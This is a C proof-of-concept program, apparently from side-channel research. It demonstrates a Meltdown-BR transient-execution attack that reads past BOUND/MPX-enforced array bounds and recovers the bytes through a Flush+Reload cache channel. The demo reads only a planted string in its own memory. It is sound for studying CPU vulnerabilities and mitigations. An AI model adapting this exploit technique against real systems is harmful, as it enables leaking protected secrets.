#define _GNU_SOURCE
#include "libcache/cacheutils.h"
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <signal.h>

char mem2[4096 * 256];

#define DOG_STR     "abcx"
#define PWD_STR     "yyyy"
#define DOG_LEN     strlen(DOG_STR)
#define PWD_LEN     strlen(PWD_STR)

#define FR_START    'a'
#define FR_END      'z'

// Define the bounds for the dog
struct {
    uint32_t low;
    uint32_t high;
} my_dog_bounds = {
    .low = 0,
    .high = DOG_LEN
};

char *buffer;
int idx = 0, fault = 0, fault_recovered = 0;

void fault_handler(int no) {
  int i;
  fault_recovered = 0;
  // Recover the data from the covert channel
  for (i = FR_START; i < FR_END; i++) {
    if (flush_reload(mem2 + i * 4096)) {
    	fault_recovered = i;
      break;
    }
  }
  printf("PF %d: dog[%d] = '%c' (recovered '%c')\n",
	    fault++, idx, buffer[idx], fault_recovered ? i : 'x');

  /* resolve faulting BOUND to retry */
  #if __MPX__
    exit(0);
  #else
    my_dog_bounds.high += PWD_LEN;
  #endif
}

int __attribute__((aligned(0x1000))) dummy;

int main(void) {
  int status, i;
  char c = 'X';
  
  // Install signal handler
  signal(SIGSEGV, fault_handler);
  memset(mem2, 1, sizeof(mem2));

  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  buffer = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE,
                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  strcpy(buffer, DOG_STR PWD_STR);

  // Flush our shared memory
  for (i = 0; i < 256; i++) {
    flush(mem2 + i * 4096);
  }

  for (idx = 0; idx < DOG_LEN + PWD_LEN; idx++) {
    // Ensure data is in the cache
    maccess(buffer);
    unsigned status;

    // Define the bounds for the dog
    #if __MPX__
      void *p = __bnd_set_ptr_bounds(buffer, DOG_LEN);
    #else
      my_dog_bounds.high = DOG_LEN;
    #endif

    // tsx begin
    #if USE_TSX
    asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
                 : "=a"(status)
                 : "a"(-1UL)
                 : "memory");
    if (status == (~0u)) {
    #endif
        /* high-latency access to prolong transient execution beyond fault */
        maccess(&dummy);

        /* explicit check to allow LFENCE insertion */
        #if __MPX__
            __bnd_chk_ptr_bounds(p, idx+1);
        #else
            asm("bound %0, (my_dog_bounds)\n\t"
                : : "r" (idx+1) : );
        #endif

        #if LFENCE
            nospec();
        #endif

        // Illegal access to data
        c = buffer[idx];
        // Encode data in the cache
        maccess(mem2 + c*4096);

    // tsx end
    #if USE_TSX
        asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
    }
    else {
        c = 'X';
        fault_recovered = 1;
    }
    #endif

    // Recover data from the cache
    for (i = FR_START; i < FR_END; i++) {
      if (flush_reload(mem2 + i * 4096)) {
        break;
      }
    }
    flush(&dummy);

    if((idx >= DOG_LEN) && !fault_recovered)
      idx--;
    else
      printf("dog[%d] = '%c' (recovered '%c')\n", idx, c, i);
  }

  printf("Meltdown-BR done!\n");

  return EXIT_SUCCESS;
}
